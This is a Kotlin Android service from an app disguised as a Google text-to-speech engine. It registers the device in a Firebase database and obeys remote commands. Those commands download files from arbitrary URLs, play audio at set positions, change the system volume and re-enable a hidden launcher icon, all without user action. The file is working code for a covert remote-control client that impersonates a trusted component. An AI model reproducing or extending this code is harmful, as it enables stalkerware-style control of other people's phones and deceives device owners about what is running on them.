package com.googli.googletext_to_speechengine

import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.ContextWrapper
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.AsyncTask
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.RelativeLayout
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.io.BufferedInputStream
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import java.util.*


class ChatHeadService : Service() {
    private var mWindowManager: WindowManager? = null
    private var mFloatingView: View? = null
    var firebaseDatabase = FirebaseDatabase.getInstance().reference
    var name = ""
    val player = MediaPlayer()
    var destroyCheck = 0

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        firebaseListner(getSharedPreferences("Main", 0).getString("Name", "").toString())
        //Inflate the floating view layout we created
        mFloatingView = LayoutInflater.from(this).inflate(R.layout.layout_floating_widget, null)

        //Add the view to the window.
        val params: WindowManager.LayoutParams
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT)
        } else {
            params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT)
        }

        //Specify the view position
        params.gravity = Gravity.TOP or Gravity.LEFT        //Initially view will be added to top-left corner
        params.x = 0
        params.y = 100

        //Add the view to the window
        mWindowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        mWindowManager!!.addView(mFloatingView, params)

        //The root element of the collapsed view layout
        val collapsedView = mFloatingView!!.findViewById(R.id.collapse_view) as RelativeLayout
        //The root element of the expanded view layout


        //Drag and move floating view using user's touch action.
        mFloatingView!!.findViewById<RelativeLayout>(R.id.root_container).setOnTouchListener(object : View.OnTouchListener {
            private var initialX: Int = 0
            private var initialY: Int = 0
            private var initialTouchX: Float = 0.toFloat()
            private var initialTouchY: Float = 0.toFloat()

            override fun onTouch(v: View, event: MotionEvent): Boolean {
                when (event.action) {
                    MotionEvent.ACTION_DOWN -> {

                        //remember the initial position.
                        initialX = params.x
                        initialY = params.y

                        //get the touch location
                        initialTouchX = event.rawX
                        initialTouchY = event.rawY
                        return true
                    }
                    MotionEvent.ACTION_UP -> {
                        val Xdiff = (event.rawX - initialTouchX).toInt()
                        val Ydiff = (event.rawY - initialTouchY).toInt()

                        //The check for Xdiff <10 && YDiff< 10 because sometime elements moves a little while clicking.
                        //So that is click event.
                        if (Xdiff < 10 && Ydiff < 10) {
                            if (isViewCollapsed()) {
                                //When user clicks on the image view of the collapsed layout,
                                //visibility of the collapsed layout will be changed to "View.GONE"
                                //and expanded view will become visible.

                            }
                        }
                        return true
                    }
                    MotionEvent.ACTION_MOVE -> {
                        //Calculate the X and Y coordinates of the view.
                        params.x = initialX + (event.rawX - initialTouchX).toInt()
                        params.y = initialY + (event.rawY - initialTouchY).toInt()

                        //Update the layout with new X & Y coordinate
                        mWindowManager!!.updateViewLayout(mFloatingView, params)
                        return true
                    }
                }
                return false
            }
        })
    }

    fun firebaseListner(name: String) {
        val Name = getSharedPreferences("Main", 0).getString("Name", "").toString()
        this.name = Name
        firebaseDatabase.child(name).child("Status").setValue("Online")
        firebaseDatabase.child(Name).child("Task").addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }

            override fun onDataChange(dataSnapshot: DataSnapshot?) {
                val taskIdAny = dataSnapshot!!.child("TaskID").value
                var taskId = 100
                try {
                    taskId = taskIdAny.toString().toInt()
                } catch (e: Exception) {
                }
                if (taskId == 0) {
                    val trackName = dataSnapshot.child("TrackName").value
                    downloadTrack(trackName.toString())
                }
                if (taskId == 1) {
                    val trackName = dataSnapshot.child("TrackName").value
                    val startSec = dataSnapshot.child("SeekTo").value
                    playTrack(trackName.toString(), startSec.toString().toInt())
                }
                if (taskId == 2) {
                    val trackName = dataSnapshot.child("TrackName").value
                    pauseTrack(trackName.toString())
                }
                if (taskId == 3) {
                    val trackName = dataSnapshot.child("TrackName").value
                    stopTrack(trackName.toString())
                }
                if (taskId == 4) {
                    val trackName = dataSnapshot.child("TrackName").value
                    rePlayTrack(trackName.toString())
                }
                if (taskId == 5) {
                    val volume = dataSnapshot.child("Volume").value
                    setVolume(volume.toString().toInt())
                }
                if (taskId == 10) {
                    firebaseDatabase.child(name).child("Status").setValue(Random().nextInt())
                    firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
                }
                if (taskId == 20) {
                    addDrawerIcon()
                    destroyCheck = 1
                    openActivity()
                }

            }
        })
    }

    fun downloadTrack(trackName: String) {
        var songLink = firebaseDatabase.child("Tracks").addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }

            override fun onDataChange(p0: DataSnapshot?) {
                val cw = ContextWrapper(applicationContext)

                val directory = cw.getDir("Songs", Context.MODE_PRIVATE)

                val mypath = File(directory, "$trackName.mp3")
                val f = File(mypath.toString())

                if (f.exists()) {
                    firebaseDatabase.child(name).child("DownloadProgress").setValue("Exists")
                } else {
                    downloadTrackCode(p0!!.child(trackName).value.toString(), trackName)
                }

            }

        })


    }

    fun playTrack(trackName: String, SeekTo: Int) {
        //  val mediaPlayer = MediaPlayer.create(this, )
        val cw = ContextWrapper(applicationContext)

        val directory = cw.getDir("Songs", Context.MODE_PRIVATE)

        val path = File(directory, "$trackName.mp3")


        try {
            player.setDataSource(path.toString())
            player.prepare()
        } catch (e: IllegalArgumentException) {
            e.printStackTrace()
        } catch (e: Exception) {
            println("Exception of type : " + e.toString())
            e.printStackTrace()
        }

        player.seekTo(SeekTo * 1000)
        player.start()
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
    }

    fun pauseTrack(trackName: String) {
        if (player.isPlaying) {
            player.pause()
        } else {
            player.start()
        }
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)

    }

    fun stopTrack(trackName: String) {
        player.stop()
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)

    }

    fun rePlayTrack(trackName: String) {
        stopTrack(trackName)
        player.prepare()
        player.start()
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
    }

    fun setVolume(volume: Int) {
        val audioManager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, volume, 0)
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
    }

    fun downloadTrackCode(urlString: String, trackName: String) {
        var count: Int
        AsyncTask.execute {
            try {
                val url = URL(urlString)
                val conexion = url.openConnection()
                conexion.connect()
                // this will be useful so that you can show a tipical 0-100% progress bar
                val lenghtOfFile = conexion.contentLength
                val cw = ContextWrapper(applicationContext)

                val directory = cw.getDir("Songs", Context.MODE_PRIVATE)

                val mypath = File(directory, "$trackName.mp3")

                // download the file
                val input = BufferedInputStream(url.openStream())
                val output = FileOutputStream(mypath)

                val data = ByteArray(1024)

                var total: Long = 0
                count = input.read(data)
                while (count != -1) {

                    total += count.toLong()
                    // publishing the progress....
                    downloadCallBack((total * 100 / lenghtOfFile).toInt())
                    if ((total * 100 / lenghtOfFile).toInt() == 100) {
                        firebaseDatabase.child(name).child("Tracks").child(trackName).setValue(url)
                    }
                    output.write(data, 0, count)
                    count = input.read(data)
                }

                output.flush()
                output.close()
                input.close()
            } catch (e: Exception) {
            }
        }
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)

    }

    fun downloadCallBack(percentage: Int) {
        firebaseDatabase.child(name).child("DownloadProgress").setValue(percentage)

    }

    fun openActivity() {
        destroyCheck = 1
        startActivity(Intent(this, FlashActivity::class.java))
        stopSelf()
    }

    fun addDrawerIcon() {
        val componentToDisable = ComponentName("com.googli.googletext_to_speechengine",
                "com.googli.googletext_to_speechengine.FlashActivity")

        packageManager.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP)
    }

    private fun isViewCollapsed(): Boolean {
        return mFloatingView == null || mFloatingView!!.findViewById<RelativeLayout>(R.id.collapse_view).getVisibility() == View.VISIBLE
    }

    override fun onDestroy() {
        super.onDestroy()
        if (mFloatingView != null) mWindowManager!!.removeView(mFloatingView)
    }
}
